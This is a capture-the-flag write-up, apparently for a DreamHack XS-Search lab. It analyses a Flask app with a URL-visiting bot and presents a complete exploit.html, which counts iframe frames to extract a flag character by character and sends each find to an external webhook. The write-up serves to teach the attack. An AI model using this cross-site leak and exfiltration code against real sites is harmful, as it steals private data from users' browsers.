# 🔎 XS-Search 

## Description

Exercise: XS-Search에서 실습하는 문제입니다.
플래그는 DH{[0123456789abcdef]{32}}의 포맷입니다.

## Background

XS-Search (Cross-Site Search) is a technique that uses `<iframe>` and `<src>` to bypass SOP policy, then analyzes timing or frame counts (e.g., `q=search`) to determine if data exists. By measuring response times or result values, we can infer the presence of data and estimate content size.

## Code Analysis

### app.py

```python
try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

notes = {
    (FLAG, True), 
    ("Hello World", False), 
    ("DreamHack", False), 
    ("carpe diem, quam minimum credula postero", False)
}

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get(url) # Uses selenium to directly visit the URL
    except TimeoutException as e:
        driver.quit()
        return True
    except Exception as e:
        driver.quit()
        return False
    driver.quit()
    return True
```

**Key Points:**

- **FLAG**: Reads the flag from `flag.txt` file and stores it in the FLAG variable (defaults to `[**FLAG**]` if file doesn't exist)
- **notes**: A set containing multiple strings, where only the flag is set to `True` (private)
- **read_url**: Uses selenium to automatically visit the provided URL with headless Chrome

### /search Endpoint

```python
@app.route("/")
def index():
    return render_template('index.html')

@app.route('/search')
def search():
    query = request.args.get('query', None)
    if query == None:
        return render_template("search.html", query=None, result=None)
    for note, private in notes:
        if private == True and request.remote_addr != "127.0.0.1" and request.headers.get("HOST") != "127.0.0.1:8000":
           # Private data requires localhost request for search access
            continue
        if query != "" and query in note:
            return render_template("search.html", query=query, result=note) 
    return render_template("search.html", query=query, result=None)
```

**Functionality:**
- Handles search requests in the format `/search?query=TEXT`
- Extracts query parameter from URL using `request.args.get('query', None)`
- **Critical Security Check**: Private notes (FLAG) can only be searched from localhost (`127.0.0.1`)
- Returns search results if query matches any note content

### /submit Endpoint

```python
@app.route("/submit", methods=["GET", "POST"])
def submit():
    if request.method == "GET":
        return render_template("submit.html")
    elif request.method == "POST":
        url = request.form.get("url", "")
        if not urlparse(url).scheme.startswith("http"):
            return '<script>alert("wrong url");history.go(-1);</script>'
        if not read_url(url):
            return '<script>alert("wrong??");history.go(-1);</script>'
        return '<script>alert("good");history.go(-1);</script>'
```

**Functionality:**
- GET request renders `submit.html`
- POST request validates and visits the provided URL using `read_url()`
- Uses `history.go(-1)` to return to previous page after showing alerts

### search.html Template

```html
{% extends "base.html" %}
{% block title %}Search{% endblock %}

{% block head %}
  {{ super() }}
{% endblock %}

{% block content %}
<h2>Search</h2><br/>
{% if result %}
  <h3>Searching "{{ query }}" found</h3>
  <iframe srcdoc="<pre>{{ result }}</pre>"></iframe>
{% elif query %}
  <h3> Searching "{{ query }}" not found</h3>
{% else %}
```

**Key Detail:**
- When `result` exists, it's displayed inside an `<iframe>` wrapped in `<pre>` tags
- This iframe structure is crucial for the XS-Search attack

## Exploitation Strategy

### Vulnerability Analysis

1. **SSRF via read_url()**: The `read_url()` function visits any provided URL, enabling requests to internal networks
2. **Localhost Access**: We can make requests to internal addresses like `http://127.0.0.1:8000/search?query=FLAG`
3. **XS-Search Opportunity**: The iframe structure allows us to detect search results by counting frames

### Attack Flow

1. **Setup**: Attacker uploads `exploit.html` to their external server
2. **Payload Delivery**: Submit the exploit URL through `/submit` endpoint  
3. **Server Execution**: Server executes `read_url()` and visits the exploit URL
4. **Internal Access**: Exploit runs from server context, enabling localhost requests
5. **Data Extraction**: Use iframe frame counting to determine search results
6. **Exfiltration**: Extract FLAG character by character and send to external server

### Setting Up External Server

Upload exploit files to an external server. For testing, you can use Python's built-in server:

```bash
python3 -m http.server
```

### XS-Search Vulnerability Testing

First, test if we can search for part of the FLAG (`DH{`) from localhost:

```html
<iframe id="iframe"></iframe>
<img id="img">
<script>
const iframe = document.getElementById("iframe");
iframe.src = "http://localhost:8000/search?query=DH{";
iframe.onload = () => {
    img.src = `https://your-webhook.request.dreamhack.games/${iframe.contentWindow.frames.length}`;
};
</script>
```

**Code Explanation:**
- `iframe.src`: Sets the iframe source to search for "DH{"
- `iframe.onload`: When loaded, sends the frame count to external webhook
- If search finds results: `frames.length = 1`
- If no results: `frames.length = 0`

## Final Exploit Code

### exploit.html

```html
<iframe id="iframe"></iframe>
<img id="img">
<script>
    async function req(url) {
        return await new Promise((resolve, reject) => {
            const iframe = document.getElementById("iframe");
            iframe.src = url;
            iframe.onload = () => { 
                if (iframe.contentWindow.frames.length != 0)
                    return resolve();
                else
                    return reject();
            };
        });
    } 

    async function search(query) {
        try {
            await req(`http://localhost:8000/search?query=${query}`);
            return true;
        } catch (e) {
            return false;
        }
    }

    async function exploit() {
        let chars = "0123456789abcdef}";
        let secret = "DH{";

        while (!secret.includes("}")) {
            for (let c of chars) {
                if (await search(secret + c)) {
                    secret += c;
                    img.src = `https://your-webhook.request.dreamhack.games/${secret}`;
                    break;
                }
            }
        }
    }

    exploit();
</script>
```

**Code Breakdown:**

1. **req(url)**: Makes an async request and resolves based on frame count
2. **search(query)**: Tests if a query returns results  
3. **exploit()**: Brute forces the flag character by character
   - Uses hexadecimal characters + `}`
   - Starts with known prefix "DH{"
   - Continues until closing brace `}` is found
   - Sends each discovered character to external webhook

### Execution Process

1. Upload `exploit.html` to your external server
2. Submit your server URL through the `/submit` endpoint
3. Monitor your webhook for incoming requests containing flag characters
4. Due to 3-second timeout, you may need multiple attempts to extract the complete flag

## Key Takeaways

This challenge demonstrates a sophisticated **SSRF + XS-Search** attack pattern where:

- **SSRF** enables access to internal services via `read_url()`
- **XS-Search** exploits iframe frame counting to leak sensitive data
- **Timing constraints** require efficient payload design
- **Character-by-character extraction** overcomes timeout limitations

The combination of these techniques shows how seemingly harmless features (URL visiting + search) can be chained together for significant data exfiltration.
